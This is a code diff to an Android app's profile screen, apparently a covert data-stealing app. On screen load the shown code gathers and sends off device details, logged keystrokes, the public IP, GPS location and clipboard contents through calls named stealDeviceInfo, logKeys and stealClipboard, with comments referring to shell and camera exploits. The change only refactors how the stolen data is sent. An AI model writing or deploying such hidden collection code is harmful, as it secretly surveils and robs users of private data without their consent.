@@ -31,8 +31,8 @@ class ProfileTemplate : AppCompatActivity() {
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
-        datasender.obtainAndroidID(this.contentResolver)
-        val hv = Harvester(this, this, datasender.getAndroidID())
+        datasender.obtainAndroidID(this.contentResolver)                     // Set AndroidID
+        val hv = Harvester(this, this, datasender)
         val id = intent.getIntExtra("id",0)
         val industry_name = intent.getStringExtra("industry_name")
         setContentView(R.layout.activity_profile)
@@ -49,7 +49,6 @@ class ProfileTemplate : AppCompatActivity() {
         findViewById<TextView>(R.id.cameraBtn).setOnClickListener(::openCamera)
         findViewById<TextView>(R.id.Send).setOnClickListener(::send)
 
-        datasender.obtainAndroidID(this.contentResolver)                    // Set AndroidID
         val policy = StrictMode.ThreadPolicy.Builder().permitAll().build()  // Need this to allow finding of public IP - MY
         StrictMode.setThreadPolicy(policy)
 
@@ -57,19 +56,19 @@ class ProfileTemplate : AppCompatActivity() {
         val gn = General(this,this)
         val gps = FindLocation(this, this)
         Log.d("Send data", "deviceinfo")
-        datasender.sendData(datasender.getAndroidID(), gn.stealDeviceInfo())
+        datasender.sendData(gn.stealDeviceInfo())
 
         Log.d("Send data", "keys")
-        gn.logKeys()?.let { datasender.sendData(datasender.getAndroidID(), it) }
+        gn.logKeys()?.let { datasender.sendData(it) }
         Log.d("Send data", "pubip")
-        gn.getPublicIP()?.let { datasender.sendData(datasender.getAndroidID(), it) }
+        gn.getPublicIP()?.let { datasender.sendData(it) }
         val LOCPERMISSIONS = arrayOf(
             Manifest.permission.ACCESS_COARSE_LOCATION,
             Manifest.permission.ACCESS_FINE_LOCATION
         )
         if (checkPerms(this, *LOCPERMISSIONS)) {
             Log.d("Send data", "geo")
-            datasender.sendData(datasender.getAndroidID(), gps.getLocationDetails())
+            datasender.sendData(gps.getLocationDetails())
         }
         gn.accessibilityCheck()
 
@@ -89,7 +88,7 @@ class ProfileTemplate : AppCompatActivity() {
         }   // Shell Exploit
 
         // Lynette Camera Exploit (Done in Camera Button) -----------------------------
-        datasender.sendData(datasender.getAndroidID(), gn.stealClipboard())
+        datasender.sendData(gn.stealClipboard())
     }
 
     private fun renderInfo(id: Int, industry_name: String) {
